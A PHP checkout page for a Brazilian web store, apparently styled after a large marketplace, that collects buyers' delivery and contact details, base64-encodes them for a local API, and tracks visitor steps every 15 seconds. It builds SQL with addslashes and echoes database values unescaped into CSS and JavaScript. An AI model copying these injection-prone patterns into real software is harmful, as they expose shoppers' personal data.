<?php 
session_start();
require_once("api/db.php");
require_once("api/facebook_pixel.php");

if (!isset($_GET["produto"])) {
    header("Location: ./index");
    exit();
}

$id = addslashes($_GET["produto"]);
$sqlx = mysqli_query($conn, "SELECT * FROM produto WHERE codigo='$id'");
$row_prod = $sqlx ? mysqli_fetch_assoc($sqlx) : null;
if (!$row_prod) {
    header("Location: ./index");
    exit();
}

$codigo = $row_prod["codigo"];
$nomeproduto = $row_prod["nome"];
$img = $row_prod["img"];
$valor = $row_prod["valor"];
$valor_num = (float)str_replace(',', '.', str_replace('.', '', (string)$valor));

// Disparar AddPaymentInfo no Pixel
echo fb_pixel_event_script('AddPaymentInfo', [
    'content_ids' => [$codigo],
    'content_name' => $nomeproduto,
    'content_type' => 'product',
    'value' => $valor_num,
    'currency' => 'BRL'
]);

$sql_conf = mysqli_query($conn, "SELECT * FROM config LIMIT 1");
$row_conf = $sql_conf ? mysqli_fetch_assoc($sql_conf) : null;
$nome_loja = $row_conf['nome'] ?? 'Minha Loja';
$cor = $row_conf['cor'] ?? '#ffe600';
$cor_botao = isset($row_conf['cor_botao']) ? $row_conf['cor_botao'] : '#3483fa';
$numerozap = $row_conf['zap'] ?? '';
$textozap = $row_conf['texto'] ?? '';
$endereco = isset($row_conf['endereco']) ? $row_conf['endereco'] : '';
$cnpj = isset($row_conf['cnpj']) ? $row_conf['cnpj'] : '';
$logo_files = glob("arquivos/logo/*.png");
$logo_loja = !empty($logo_files) ? $logo_files[0] : "";
$img_src = (strpos((string)$img, 'http') === 0) ? $img : "./arquivos/produtos/$codigo/$img";
$numerozap = isset($numerozap) ? $numerozap : '';
$textozap = isset($textozap) ? $textozap : '';
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Editar endereço - <?php echo htmlspecialchars($nome_loja); ?></title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root {
            --store-yellow: <?php echo $cor; ?>;
            --store-blue: <?php echo $cor_botao; ?>;
            --store-bg-gray: #ebebeb;
            --store-text-dark: #333;
            --store-green: #00a650;
        }
        body { font-family: "Proxima Nova",-apple-system,Roboto,Arial,sans-serif; background-color: var(--store-bg-gray); color: var(--store-text-dark); -webkit-font-smoothing: antialiased; overflow-x: hidden; }
        
        /* Topo Original */
        header { background-color: var(--store-yellow); padding: 8px 16px; position: sticky; top: 0; z-index: 100; }
        .header-content-wrapper { max-width: 1200px; margin: 0 auto; }
        .header-full { display: flex; flex-direction: column; gap: 8px; }
        .header-top-row { display: flex; align-items: center; justify-content: space-between; }
        .header-logo-full { height: 40px; object-fit: contain; }
        .icon-btn { font-size: 20px; color: #fff; cursor: pointer; }
        .location-bar { background: var(--store-yellow); padding: 8px 16px; display: flex; align-items: center; gap: 8px; font-size: 13px; color: #333; border-top: 1px solid rgba(0,0,0,0.05); }

        .checkout-wrap { max-width: 1200px; margin: 0 auto; padding: 24px 16px 34px; display: flex; flex-direction: column; align-items: center; }
        .page-title { font-size: 24px; line-height: 1.2; font-weight: 600; margin: 0 0 18px; color: #333; width: 100%; max-width: 100%; text-align: left; }
        .form-card { width: 100%; max-width: 1200px; background: #fff; border-radius: 2px; padding: 28px 46px 30px; box-shadow: 0 1px 1px rgba(0,0,0,.04); margin: 0 auto; }
        .form-grid { display: grid; grid-template-columns: 1fr 198px; column-gap: 14px; row-gap: 16px; align-items: end; }
        .form-group { min-width: 0; }
        .form-group.full { grid-column: 1 / -1; }
        .form-label { display: block; color: #333; font-size: 14px; line-height: 1.2; margin-bottom: 6px; }
        .form-control { width: 100%; height: 40px; border: 1px solid #bfbfbf; border-radius: 6px; background: #fff; color: #333; font-size: 15px; outline: none; padding: 0 11px; }
        .zip-row { display: grid; grid-template-columns: 1fr auto; gap: 12px; align-items: end; }
        .cep-help { height: 40px; border: 0; background: transparent; color: var(--store-blue); font-size: 14px; cursor: pointer; white-space: nowrap; padding: 0 2px; }
        .number-row { display: grid; grid-template-columns: 1fr auto; gap: 10px; align-items: center; }
        .no-number { display: inline-flex; align-items: center; gap: 7px; color: #333; font-size: 14px; white-space: nowrap; padding-top: 22px; }
        .textarea-control { width: 100%; min-height: 40px; height: 40px; padding: 10px 11px; resize: none; line-height: 18px; }
        .section-question { margin: 28px 0 14px; color: #333; font-size: 15px; font-weight: 400; }
        .address-type { display: flex; flex-direction: column; gap: 11px; margin-bottom: 26px; }
        .radio-card { display: flex; align-items: center; gap: 10px; color: #333; font-size: 15px; cursor: pointer; }
        .radio-icon { width: 22px; color: #555; text-align: center; font-size: 18px; }
        .contact-title { margin: 0 0 2px; font-size: 20px; line-height: 1.25; font-weight: 600; color: #333; }
        .contact-subtitle { margin: 0 0 18px; color: #777; font-size: 12px; }
        .save-btn { display: inline-flex; align-items: center; justify-content: center; min-width: 92px; height: 44px; margin-top: 22px; padding: 0 24px; border: none; border-radius: 6px; background: var(--store-blue); color: #fff; font-size: 15px; font-weight: 600; cursor: pointer; }
        .hidden-product { display: none; }


        /* ===== RESPONSIVIDADE DESKTOP ===== */
        @media (min-width: 1200px) {
            .checkout-wrap { padding: 32px 20px 40px; }
            .form-card { padding: 32px 40px; max-width: 1200px; margin: 0 auto; }
            .form-grid { grid-template-columns: 1fr 1fr; gap: 20px; }
            .zip-row { grid-template-columns: 1fr 1fr; gap: 12px; }
            .number-row { grid-template-columns: 1fr 1fr; gap: 12px; }
            .page-title { font-size: 28px; max-width: 1200px; margin: 0 auto 18px; }
        }

        /* ===== RESPONSIVIDADE TABLET ===== */
        @media (min-width: 768px) and (max-width: 1199px) {
            .form-card { padding: 28px 24px; max-width: 100%; }
            .form-grid { grid-template-columns: 1fr 1fr; gap: 16px; }
            .zip-row { grid-template-columns: 1fr 1fr; gap: 8px; }
            .number-row { grid-template-columns: 1fr 1fr; gap: 12px; }
            .page-title { font-size: 24px; }
        }

        /* ===== RESPONSIVIDADE MOBILE ===== */
        @media (max-width: 767px) {
            .form-card { padding: 22px 16px 24px; }
            .form-grid { grid-template-columns: 1fr; gap: 12px; }
            .zip-row { grid-template-columns: 1fr; gap: 4px; }
            .number-row { grid-template-columns: 1fr; gap: 8px; }
            .no-number { padding-top: 0; }
            .page-title { font-size: 20px; }
        }

        @media (max-width: 480px) {
            .form-card { padding: 18px 12px 20px; }
            .form-grid { grid-template-columns: 1fr; gap: 10px; }
            .zip-row { grid-template-columns: 1fr; gap: 4px; }
            .number-row { grid-template-columns: 1fr; gap: 6px; }
            .page-title { font-size: 18px; }
            .form-label { font-size: 13px; }
            .form-input { font-size: 14px; padding: 10px 8px; }
        }
    </style>
    <?php echo fb_pixel_base_code(); ?>
</head>
<body>
    <header class="store-header-container checkout-header-simple">
      <div class="header-content-wrapper">
        <div style="display: flex; align-items: center; justify-content: flex-start; padding: 12px 0; gap: 15px;">
            <a href="javascript:history.back()" style="color: #333; text-decoration: none; font-size: 18px;"><i class="fa-solid fa-arrow-left"></i></a>
            <span style="font-weight: bold; font-size: 18px; color: #333;">Entrega da sua compra</span>
        </div>
      </div>
    </header>

    <main class="checkout-wrap">
        <h1 class="page-title">Entrega da sua compra</h1>
        <section class="form-card" style="padding: 0;">
            <form id="formAddress" onsubmit="proceed(); return false;">
                
                <!-- PARTE 1: Visível por padrão -->
                <div id="checkout-parte-1" style="padding: 28px 46px 10px;">
                    <!-- CEP -->
                    <div class="form-group full" style="position: relative; margin-bottom: 20px;">
                        <label class="form-label" for="cep" style="font-weight: 500;">CEP</label>
                        <div style="position: relative;">
                            <input type="text" id="cep" class="form-control" placeholder="Ex.: 05410001" inputmode="numeric" required style="padding-right: 120px;">
                            <button type="button" class="cep-help" onclick="window.open('https://buscacepinter.correios.com.br/app/endereco/index.php', '_blank')" style="position: absolute; right: 10px; top: 0; bottom: 0; height: 100%; color: var(--store-blue); font-weight: 500;">Não sei meu CEP</button>
                        </div>
                    </div>

                    <!-- RUA / AVENIDA -->
                    <div class="form-group full" style="margin-bottom: 20px;">
                        <label class="form-label" for="rua" style="font-weight: 500;">Rua / Avenida</label>
                        <input type="text" id="rua" class="form-control" placeholder="Ex: Av. das Nações Unidas" required>
                    </div>

                    <!-- NÚMERO e COMPLEMENTO -->
                    <div class="form-grid" style="grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px;">
                        <div class="form-group">
                            <label class="form-label" for="numero" style="font-weight: 500;">Número</label>
                            <div style="position: relative;">
                                <input type="text" id="numero" class="form-control" placeholder="Ex: 123" required style="padding-right: 110px;">
                                <label class="no-number" for="semNumero" style="position: absolute; right: 12px; top: 50%; transform: translateY(-50%); font-size: 13px; color: #999; display: flex; align-items: center; gap: 5px; margin: 0; padding-top: 0 !important; cursor: pointer;">
                                    Sem número <input type="checkbox" id="semNumero" onchange="toggleNum(this)" style="width: 16px; height: 16px; margin: 0; cursor: pointer;">
                                </label>
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="form-label" for="complemento" style="font-weight: 500;">Complemento <span style="color:#999;font-weight:normal;">(opcional)</span></label>
                            <input type="text" id="complemento" class="form-control" placeholder="Ex: Apto 12">
                        </div>
                    </div>

                    <!-- CAMPOS OCULTOS -->
                    <div class="hidden-product">
                        <input type="text" id="bairro">
                        <input type="text" id="cidade">
                        <input type="text" id="estado">
                    </div>

                    <!-- DADOS DE QUEM VAI RECEBER -->
                    <div style="margin-top: 10px;">
                        <h2 class="contact-title" style="font-size: 16px; margin-bottom: 4px;">Dados de quem vai receber</h2>
                        <p class="contact-subtitle" style="font-size: 13px; margin-bottom: 20px;">Ligaremos se houver algum problema com a entrega.</p>
                        
                        <div class="form-group full" style="margin-bottom: 20px;">
                            <label class="form-label" for="nome" style="font-weight: 500;">Nome completo</label>
                            <input type="text" id="nome" class="form-control" required>
                        </div>

                        <div class="form-group full" style="margin-bottom: 20px;">
                            <label class="form-label" for="telefone" style="font-weight: 500;">Telefone de contato</label>
                            <div style="display: flex; align-items: center; border: 1px solid #bfbfbf; border-radius: 6px; overflow: hidden; height: 40px; background: #fff;">
                                <span style="background: #f5f5f5; padding: 0 12px; font-size: 15px; color: #333; height: 100%; display: flex; align-items: center; border-right: 1px solid #bfbfbf;">BR+55</span>
                                <input type="tel" id="telefone" class="form-control" placeholder="(11) 96123-4567" required style="border: none; border-radius: 0; outline: none; box-shadow: none;">
                            </div>
                        </div>

                        <div class="form-group full" style="margin-bottom: 20px; display: none;">
                            <label class="form-label" for="email">E-mail</label>
                            <input type="email" id="email" class="form-control" placeholder="Ex: seu@email.com" value="cliente@email.com">
                        </div>
                        <div class="form-group full" style="margin-bottom: 20px; display: none;">
                            <label class="form-label" for="cpf">CPF</label>
                            <input type="text" id="cpf" class="form-control" inputmode="numeric" value="000.000.000-00">
                        </div>
                    </div>
                </div><!-- /#checkout-parte-1 -->

                <!-- PARTE 2: Inicialmente oculta, exibe após o CEP -->
                <div id="checkout-parte-2" style="display: none; padding: 0 46px 30px; border-top: 1px solid #eee; margin-top: 10px; padding-top: 30px;">
                    <h3 style="font-size: 18px; font-weight: 600; margin-bottom: 4px; color: #333;">Conte mais sobre seu endereço</h3>
                    <p style="font-size: 13px; color: #666; margin-bottom: 20px;">Nos ajuda a encontrar você com mais facilidade na hora da entrega</p>
                    
                    <div style="display: flex; gap: 15px; margin-bottom: 25px;">
                        <div class="tipo-local-btn active" style="flex: 1; border: 1px solid #3483FA; box-shadow: 0 0 0 0.5px #3483FA; border-radius: 6px; padding: 16px; cursor: pointer; text-align: left; background-color: #fff;" onclick="document.getElementById('radio_casa').checked = true;">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 12px;">
                                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
                                <polyline points="9 22 9 12 15 12 15 22"></polyline>
                            </svg>
                            <div style="font-weight: 400; font-size: 15px; color: #333; margin-bottom: 2px;">Uma residência</div>
                            <div style="font-size: 13px; color: #999;">Casa, prédio, condomínio</div>
                            <input type="radio" name="tipo" id="radio_casa" value="casa" checked style="display: none;">
                        </div>
                        <div class="tipo-local-btn" style="flex: 1; border: 1px solid #E5E5E5; border-radius: 6px; padding: 16px; cursor: pointer; text-align: left; background-color: #fff;" onclick="document.getElementById('radio_trabalho').checked = true;">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#333" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 12px;">
                                <path d="M3 7v14h18V7"></path>
                                <path d="M3 7l2-4h14l2 4"></path>
                                <path d="M3 7c0 1.5 1.5 3 3 3s3-1.5 3-3 3 1.5 3 3 3-1.5 3-3 3 1.5 3 3 3-1.5 3-3"></path>
                                <path d="M9 21v-5a2 2 0 0 1 2-2h2a2 2 0 0 1 2 2v5"></path>
                            </svg>
                            <div style="font-weight: 400; font-size: 15px; color: #333; margin-bottom: 2px;">Um local de trabalho</div>
                            <div style="font-size: 13px; color: #999;">Loja, escritório, comércio</div>
                            <input type="radio" name="tipo" id="radio_trabalho" value="trabalho" style="display: none;">
                        </div>
                    </div>

                    <div style="display: flex; flex-direction: column; gap: 20px; margin-bottom: 30px;">
                        <div style="display: flex; align-items: center; gap: 12px;">
                            <label class="switch-toggle" style="position: relative; display: inline-block; width: 44px; height: 24px;">
                              <input type="checkbox" id="condominio" style="opacity: 0; width: 0; height: 0;">
                              <span class="slider round" style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px;"></span>
                            </label>
                            <span style="font-size: 15px; color: #333;">Fica em um condomínio fechado</span>
                        </div>
                        <div style="display: flex; align-items: center; gap: 12px;">
                            <label class="switch-toggle" style="position: relative; display: inline-block; width: 44px; height: 24px;">
                              <input type="checkbox" id="portaria" style="opacity: 0; width: 0; height: 0;">
                              <span class="slider round" style="position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px;"></span>
                            </label>
                            <span style="font-size: 15px; color: #333;">É possível deixar pacotes na portaria</span>
                        </div>
                    </div>

                    <div class="form-group full" style="margin-bottom: 30px;">
                        <label class="form-label" for="referencia" style="font-weight: 500;">Referência</label>
                        <textarea id="referencia" class="form-control textarea-control" maxlength="128" placeholder="Ex: Casa azul, de esquina" style="height: 80px;"></textarea>
                    </div>

                    <div style="display: flex; flex-direction: column; gap: 12px;">
                        <button type="submit" class="save-btn" style="width: 100%; height: 48px; font-size: 16px; margin: 0;">Salvar</button>
                        <button type="button" class="cancel-btn" style="width: 100%; height: 48px; font-size: 16px; margin: 0; background: #e6f0fa; color: var(--store-blue); border: none; border-radius: 6px; font-weight: 600; cursor: pointer;" onclick="document.getElementById('checkout-parte-2').style.display='none';">Cancelar</button>
                    </div>
                </div><!-- /#checkout-parte-2 -->

            </form>
        </section>

        <style>
            .switch-toggle .slider:before {
                position: absolute; content: ""; height: 20px; width: 20px; left: 2px; bottom: 2px; background-color: white; transition: .4s; border-radius: 50%;
            }
            .switch-toggle input:checked + .slider { background-color: var(--store-blue); }
            .switch-toggle input:checked + .slider:before { transform: translateX(20px); }
            
            /* Ajustes Mobile para o Form */
            @media (max-width: 767px) {
                #checkout-parte-1 { padding: 22px 16px 10px !important; }
                #checkout-parte-2 { padding: 0 16px 24px !important; }
                .form-grid { grid-template-columns: 1fr !important; gap: 16px !important; }
                .tipo-local-btn { padding: 12px !important; }
            }
        </style>

        <script>
            document.addEventListener('DOMContentLoaded', function() {
                const cepInput = document.getElementById('cep');
                const parte2 = document.getElementById('checkout-parte-2');
                
                // Mostrar a parte 2 quando o CEP estiver completo
                cepInput.addEventListener('keyup', function() {
                    let val = this.value.replace(/\D/g, '');
                    if (val.length >= 8) {
                        setTimeout(() => {
                            parte2.style.display = 'block';
                            parte2.scrollIntoView({ behavior: 'smooth', block: 'start' });
                        }, 800); // delay para dar tempo do viacep
                    } else {
                        parte2.style.display = 'none';
                    }
                });

                // Lógica dos botões de Tipo de Local
                const tipoBotoes = document.querySelectorAll('.tipo-local-btn');
                tipoBotoes.forEach(btn => {
                    btn.addEventListener('click', function() {
                        tipoBotoes.forEach(b => {
                            b.classList.remove('active');
                            b.style.borderColor = '#E5E5E5';
                            b.style.boxShadow = 'none';
                        });
                        this.classList.add('active');
                        this.style.borderColor = '#3483FA';
                        this.style.boxShadow = '0 0 0 0.5px #3483FA';
                    });
                });
            });
        </script>
    </main>

    <footer class="footer-main">
      <div class="footer-content">
        <div class="footer-top">
          <div class="footer-links-container">
            <a href="politica-de-privacidade" class="footer-link">Política de Privacidade</a>
            <a href="termos-de-uso" class="footer-link">Termos de Uso</a>
            <a href="trocas-e-devolucoes" class="footer-link">Trocas e Devoluções</a>
            <a href="https://api.whatsapp.com/send?phone=<?php echo isset($numerozap) ? $numerozap : ''; ?>&text=<?php echo isset($textozap) ? urlencode($textozap) : ''; ?>" class="footer-link">Contato</a>
          </div>
        </div>
        <div class="footer-bottom">
          <p class="footer-copyright">Copyright © <?php echo date('Y'); ?> <?php echo htmlspecialchars($nome_loja); ?>. Todos os direitos reservados.</p>
          <p class="footer-info">CNPJ: <?php echo !empty($cnpj) ? htmlspecialchars($cnpj) : "00.000.000/0001-00"; ?> | Endereço: <?php echo !empty($endereco) ? htmlspecialchars($endereco) : "Av. Paulista, 1000 - São Paulo, SP"; ?></p>
        </div>
      </div>
    </footer>
    <style>
    .footer-main {
      background-color: #f5f5f5;
      border-top: 1px solid #e0e0e0;
      padding: 40px 20px 30px;
      margin-top: 60px;
      font-family: "Montserrat", "Proxima Nova", "Helvetica Neue", Helvetica, Arial, sans-serif;
    }
    .footer-content {
      max-width: 1200px;
      margin: 0 auto;
    }
    .footer-top {
      margin-bottom: 30px;
    }
    .footer-links-container {
      display: flex;
      flex-wrap: wrap;
      gap: 20px;
      margin-bottom: 25px;
      justify-content: center;
    }
    .footer-link {
      display: inline-block;
      font-size: 13px;
      color: #666;
      text-decoration: none;
      transition: color 0.2s ease;
    }
    .footer-link:hover {
      color: #3483fa;
    }
    .footer-bottom {
      border-top: 1px solid #ddd;
      padding-top: 20px;
      text-align: center;
    }
    .footer-copyright {
      font-size: 13px;
      color: #666;
      font-weight: 400;
      margin-bottom: 8px;
    }
    .footer-info {
      font-size: 12px;
      color: #999;
      font-weight: 400;
      line-height: 1.4;
      margin: 0;
    }
    @media (max-width: 768px) {
      .footer-main {
        padding: 30px 15px 20px;
        margin-top: 40px;
      }
      .footer-links-container {
        gap: 12px;
        justify-content: center;
      }
      .footer-link {
        font-size: 12px;
        display: inline-block;
      }
      .footer-copyright {
        font-size: 12px;
        text-align: center;
      }
      .footer-info {
        font-size: 11px;
        text-align: center;
      }
    }
    @media (max-width: 480px) {
      .footer-links-container {
        gap: 8px;
        flex-direction: column;
        align-items: center;
      }
      .footer-link {
        font-size: 11px;
        display: block;
        margin-bottom: 4px;
      }
      .footer-copyright {
        font-size: 11px;
        text-align: center;
      }
      .footer-info {
        font-size: 10px;
        text-align: center;
      }
    }
    </style>

    <script>
        const codigoProduto = "<?php echo $codigo; ?>";

        function toggleNum(cb) {
            if (cb.checked) { $('#numero').val('S/N').prop('disabled', true); }
            else { $('#numero').val('').prop('disabled', false).focus(); }
        }

        $(document).ready(function(){
            $('#cpf').mask('000.000.000-00');
            $('#cep').mask('00000-000');
            $('#telefone').mask('(00) 00000-0000');

            $('#cep').on('blur', function(){
                const cep = $(this).val().replace(/\D/g, '');
                if(cep.length === 8) {
                    $.getJSON('https://viacep.com.br/ws/' + cep + '/json/', function(json){
                        if(!json.erro) {
                            $('#rua').val(json.logradouro || '');
                            $('#bairro').val(json.bairro || '');
                            $('#cidade').val(json.localidade || '');
                            $('#estado').val(json.uf || '');
                            $('#numero').focus();
                        }
                    });
                }
            });
            sendOnline('address');
            setInterval(function(){ sendOnline('address'); }, 15000);
        });

        function proceed() {
            const formData = {
                nome: $('#nome').val(),
                email: $('#email').val(),
                cpf: $('#cpf').val().replace(/\D/g, ''),
                telefone: $('#telefone').val().replace(/\D/g, ''),
                cep: $('#cep').val().replace(/\D/g, ''),
                rua: $('#rua').val(),
                numero: $('#numero').val(),
                bairro: $('#bairro').val(),
                cidade: $('#cidade').val(),
                estado: $('#estado').val(),
                complemento: $('#complemento').val(),
                referencia: $('#referencia').val(),
                tipo: $('input[name="tipo"]:checked').val()
            };
            localStorage.setItem('cliente_dados', JSON.stringify(formData));
            $('.save-btn').prop('disabled', true).html('<i class="fa-solid fa-spinner fa-spin"></i> Salvando...');

            const cartData = JSON.parse(localStorage.getItem('lojavirtual') || '{"quantos":"1","precoFinal":"0,00"}');
            const vSel = localStorage.getItem('variacoes_selecionadas') || '{}';
            
            // Payload atômico com TODOS os dados para remarketing e checkout
            const payloadCompleto = btoa(unescape(encodeURIComponent(JSON.stringify({
                api: 'salvar_cadastro',
                nome: formData.nome,
                email: formData.email,
                cpf: formData.cpf,
                celular: formData.telefone,
                telefone: formData.telefone,
                cep: formData.cep,
                endereco: formData.rua,
                rua: formData.rua,
                numero: formData.numero,
                bairro: formData.bairro,
                cidade: formData.cidade,
                estado: formData.estado,
                complemento: formData.complemento,
                referencia: formData.referencia,
                destinatario: formData.nome,
                quantidade: cartData.quantos || '1',
                total: cartData.precoFinal || '0,00',
                valortotal: cartData.precoFinal || '0,00',
                produto_codigo: codigoProduto,
                produto_nome: "<?php echo addslashes($nomeproduto); ?>",
                variacoes: vSel
            }))));

            // Caminho explícito para servidores sem DirectoryIndex em /api/.
            $.post('api/index.php', { p: payloadCompleto }, function(retorno) {
                if (String(retorno).trim() === 'ok') {
                    window.location.href = 'payment.php?produto=' + codigoProduto;
                } else {
                    $('.save-btn').prop('disabled', false).html('Continuar');
                    alert('Não foi possível salvar seus dados.\n\n' + String(retorno).trim());
                    console.error('Falha ao salvar cadastro:', retorno);
                }
            }).fail(function(xhr){
                $('.save-btn').prop('disabled', false).html('Continuar');
                alert('Não foi possível salvar seus dados. Verifique a configuração do banco e tente novamente.\n\nResposta: ' + (xhr.responseText || 'sem resposta'));
                console.error('Erro HTTP ao salvar cadastro:', xhr.responseText);
            });
        }

        function sendOnline(etapa) {
            const payload = btoa(unescape(encodeURIComponent(JSON.stringify({
                api: 'online',
                etapa: etapa,
                dispositivo: /Android|iPhone/i.test(navigator.userAgent) ? 'mobile' : 'desktop'
            }))));
            $.post('api/index.php', { p: payload });
        }
    </script>
</body>
</html>
